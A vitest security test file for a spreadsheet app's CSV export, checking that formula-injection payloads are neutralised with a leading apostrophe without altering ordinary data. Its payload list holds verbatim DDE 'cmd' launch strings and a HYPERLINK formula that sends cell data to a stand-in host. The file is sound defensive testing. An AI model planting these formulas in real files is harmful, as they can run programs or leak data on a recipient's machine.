// Copyright 2026 Suruch Chakrapeesirisuk
// SPDX-License-Identifier: Apache-2.0

import { describe, expect, it } from "vitest";
import { neutraliseCsvField, parseCsv, toCsv, valuesToCsvGrid } from "./csv";
import { computeSheet, createEmptySheet, setCellRaw } from "./sheet";
import { rescueSheets } from "./crashRescue";

/**
 * CSV injection, from the attacker's side.
 *
 * Its own file rather than more cases in `csv.test.ts`, because these are not tests of a format —
 * they are tests of a threat, and `scripts/counts.mjs` counts the security suite from a list of
 * files. A reader who wants to know what "security tests" means here can open one file and see.
 *
 * The threat model, stated plainly so the tests can be judged against it: a value this app never
 * chose — text fetched from someone's API through a live data source, or a field in a file a
 * colleague sent — is written into an export, and the export is opened in Excel by a third person.
 * Excel reads a field starting with `=`, `+`, `-` or `@` as a formula, and its formula language can
 * start programs over DDE. The person who typed the payload and the person it runs on are not the
 * same person, which is exactly what makes it worth a gate.
 */

/** The payloads in every published write-up of this, kept verbatim rather than paraphrased. */
const PAYLOADS = [
  "=cmd|'/c calc'!A0",
  "+cmd|'/c calc'!A0",
  "-cmd|'/c calc'!A0",
  "@SUM(1+1)*cmd|'/c calc'!A0",
  "=HYPERLINK(\"http://evil.example/?\"&A1,\"click\")",
  "=1+1",
];

describe("what an export does with a payload", () => {
  it("never lets one out with a live first character", () => {
    for (const payload of PAYLOADS) {
      // A payload carrying a quote gets wrapped by the ordinary RFC 4180 quoting, so the
      // apostrophe is the first character *inside* the field rather than of the line.
      const field = toCsv([[payload]], { bom: false }).replace(/^"/, "");
      expect(field.startsWith("'"), `${payload} left as-is`).toBe(true);
    }
  });

  it("keeps the payload readable rather than deleting it", () => {
    // Dropping the value would be a different bug: the person exporting has a right to their data,
    // and a silently emptied cell is worse than a visible one that cannot run.
    expect(toCsv([["+cmd|'/c calc'!A0"]], { bom: false })).toContain("cmd|'/c calc'!A0");
  });

  it("does the same through a whole sheet, the way the export button does", () => {
    // The path the toolbar actually takes: raw cells → computeSheet → valuesToCsvGrid → toCsv.
    let sheet = createEmptySheet(PAYLOADS.length, 1);
    PAYLOADS.forEach((p, i) => (sheet = setCellRaw(sheet, i, 0, p)));
    const csv = toCsv(valuesToCsvGrid(computeSheet(sheet).values), { bom: false });

    for (const line of csv.split("\r\n")) {
      expect(/^["']?[=+\-@]/.test(line) && !line.startsWith("'"), `line still live: ${line}`).toBe(false);
    }
  });

  it("does the same in the crash rescue, which writes what was typed", () => {
    // The rescue deliberately hands back formula text rather than values, so it is the one export
    // that carries `=` on purpose — and therefore the one most likely to be forgotten.
    const stored = JSON.stringify({
      state: { sheets: [{ id: "a", name: "s", sheet: { rows: 1, cols: 1, cells: [["+cmd|'/c calc'!A0"]] } }] },
    });
    expect(rescueSheets(stored)[0].csv).toContain("'+cmd");
  });
});

describe("what it must not do to ordinary data", () => {
  // Every one of these is how the mitigation gets reverted a week after it ships.
  it("leaves a negative number alone", () => {
    expect(neutraliseCsvField("-1500")).toBe("-1500");
    expect(neutraliseCsvField("-0.25")).toBe("-0.25");
    expect(neutraliseCsvField("-1.5e-9")).toBe("-1.5e-9");
  });

  it("leaves Thai text, headings and empty cells alone", () => {
    for (const ordinary of ["ยอดขาย", "กาแฟ, เย็น", "2026-09-18", "", "A1"]) {
      expect(neutraliseCsvField(ordinary)).toBe(ordinary);
    }
  });

  it("catches a lookalike that is not a number", () => {
    // `-1+1` is text to this app and a formula to Excel, which is the whole gap in one example.
    expect(neutraliseCsvField("-1+1")).toBe("'-1+1");
  });

  it("catches a leading tab or newline, which Excel also treats as a formula lead-in", () => {
    expect(neutraliseCsvField("\t=1+1")).toBe("'\t=1+1");
    expect(neutraliseCsvField("\r=1+1")).toBe("'\r=1+1");
  });
});

describe("the round trip through this app is unchanged", () => {
  it("reads back exactly what went in", () => {
    const rows = [
      ["ชื่อ", "ยอด", "หมายเหตุ"],
      ["กาแฟ", "-1500", "+cmd|'/c calc'!A0"],
      ["ชา", "35", "-1+1"],
    ];
    expect(parseCsv(toCsv(rows, { bom: false }))).toEqual(rows);
  });

  it("does not stack apostrophes when a file goes out and back twice", () => {
    const rows = [["+cmd|'/c calc'!A0"]];
    const once = parseCsv(toCsv(rows, { bom: false }));
    const twice = parseCsv(toCsv(once, { bom: false }));
    expect(twice).toEqual(rows);
  });

  it("leaves an apostrophe that is part of the data", () => {
    // Only the shape this app writes comes off: an apostrophe followed by a risky character. A
    // name or a quotation keeps its own.
    expect(parseCsv(toCsv([["'ก'"], ["it's fine"]], { bom: false }))).toEqual([["'ก'"], ["it's fine"]]);
  });
});
